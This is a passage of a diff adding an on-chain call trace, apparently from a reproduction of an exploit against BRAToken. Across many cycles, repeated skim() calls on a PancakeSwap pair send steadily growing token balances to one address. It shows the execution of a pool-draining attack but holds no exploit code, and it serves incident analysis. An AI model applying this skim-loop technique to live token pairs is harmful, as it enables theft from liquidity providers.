+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 102513391381191860164418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 93922249576401939946377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 105331058868483918362618
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 96739917063693998144577) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 108233256380394738306818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 99642114575604818088777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 111222519817662882849218
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 102631378012872962631177) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 114301461158049071728118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 105710319353259151510077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 117472770738646846273418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 108881628933856926055377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 120739219606662554054918
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 112148077801872633836877) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 124103661940718733069818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 115512520135928812851777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 127569037544796597455318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 118977895740006677237277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 131138374416996797772218
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 122547232612206877554177) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 134814791395363004098718
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 126223649590573083880677) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 138601500883080196615118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 130010359078290276397077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 142501811655428904906818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 133910669850638984688777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 146519131750948074447218
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 137927989946158154229177) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 150656971449332819073818
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 142065829644542898855777) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 154918946338669106039318
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 146327804533879185821277) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 159308780474685481613918
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 150717638669895561395877) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 163830309634782348455618
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 155239167829992428237577) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 168487484669682121302518
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 159896342864892201084477) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 173284374955628887334918
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 164693233150838967116877) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 178225171950154056348218
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 169634030145364136130177) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 183314192854514980432118
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 174723051049725060214077) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 188555884386006732238418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 179964742581216812020377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 193954826663443236599018
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 185363684858653316380977) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 199515737209202836090418
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 190924595404412915872377) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x692b00fc() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x0c4217b9() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x6db65f50() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0xc837430e() -> 0x000000
+        [5][STATICCALL] from=PancakePair, to=BEP20USDT, balanceOf(account(address): 0x8F4BA1) -> 477863210521495817138589
+        [5][CALL] from=PancakePair, to=BEP20USDT, transfer(recipient(address): 0x8F4BA1, amount(uint256): 0) -> True
+      [4][CALL] from=0x1fae46, to=PancakePair, skim(to(address): 0x8F4BA1) -> None
+        [5][STATICCALL] from=PancakePair, to=BRAToken, balanceOf(account(address): 0x8F4BA1) -> 205243475071335223566518
+        [5][CALL] from=PancakePair, to=BRAToken, transfer(recipient(address): 0x8F4BA1, amount(uint256): 196652333266545303348477) -> True
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x2684b406() -> 0x000000
+          [6][STATICCALL] from=BRAToken, to=0x0ed9cf, 0x97f6318b() -> 0x000000
